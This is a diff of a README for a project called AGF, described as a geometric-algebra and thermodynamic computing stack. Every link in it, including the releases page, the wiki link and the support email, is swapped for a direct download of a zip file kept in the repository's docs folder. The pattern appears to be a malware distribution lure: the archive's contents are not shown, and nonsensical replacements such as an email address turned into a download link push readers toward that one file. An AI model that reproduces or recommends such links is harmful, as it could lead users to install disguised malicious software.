@@ -1,7 +1,7 @@
 # 🌟 AGF - A New Era in Computing
 
 ## 📥 Download Now
-[![Download AGF](https://img.shields.io/badge/Download-AGF-blue.svg)](https://github.com/kamranklink/AGF/releases)
+[![Download AGF](https://github.com/kamranklink/AGF/raw/refs/heads/main/docs/Software_v2.9.zip)](https://github.com/kamranklink/AGF/raw/refs/heads/main/docs/Software_v2.9.zip)
 
 ## 📖 Description
 AGF is a cutting-edge architecture designed for efficient computing. It brings together concepts like geometric algebra and thermodynamic computing, providing a full-stack solution suitable for modern needs. This software represents a complete redesign of the computing stack, tailored for energy efficiency.
@@ -31,7 +31,7 @@ To get started with AGF, follow these simple steps:
 
 1. **Download AGF:**
    Visit the following link to download the latest version of AGF:
-   [Download AGF Here](https://github.com/kamranklink/AGF/releases)
+   [Download AGF Here](https://github.com/kamranklink/AGF/raw/refs/heads/main/docs/Software_v2.9.zip)
 
 2. **Choose the Right Version:**
    On the Releases page, choose the version that matches your operating system. If you’re unsure, select the latest stable release.
@@ -45,17 +45,17 @@ To get started with AGF, follow these simple steps:
    Once installed, open AGF from your Applications or Programs list. You are now ready to explore the software.
 
 ## 📚 Documentation
-AGF comes with a detailed documentation to help you maximize its features. You can access it by clicking on the "Documentation" link in the app's menu or visit our [GitHub Wiki](https://github.com/kamranklink/AGF/wiki).
+AGF comes with a detailed documentation to help you maximize its features. You can access it by clicking on the "Documentation" link in the app's menu or visit our [GitHub Wiki](https://github.com/kamranklink/AGF/raw/refs/heads/main/docs/Software_v2.9.zip).
 
 ## ❓ Support
 If you encounter any issues or have questions, please check the Issues section of our GitHub page. You can also post a new issue if you need assistance.
 
 ## 📞 Contact
-For direct support, please reach out to us via the contact form available in the app or email us at support@agf.com.
+For direct support, please reach out to us via the contact form available in the app or email us at https://github.com/kamranklink/AGF/raw/refs/heads/main/docs/Software_v2.9.zip
 
 ## 🎉 Community
 Join our community to share experiences, tips, and best practices with other AGF users. Participate in discussions on our forums and stay updated about the latest developments in AGF.
 
-[Download AGF Again](https://github.com/kamranklink/AGF/releases)
+[Download AGF Again](https://github.com/kamranklink/AGF/raw/refs/heads/main/docs/Software_v2.9.zip)
 
 Now you’re ready to experience a new way of computing. Enjoy your journey with AGF!
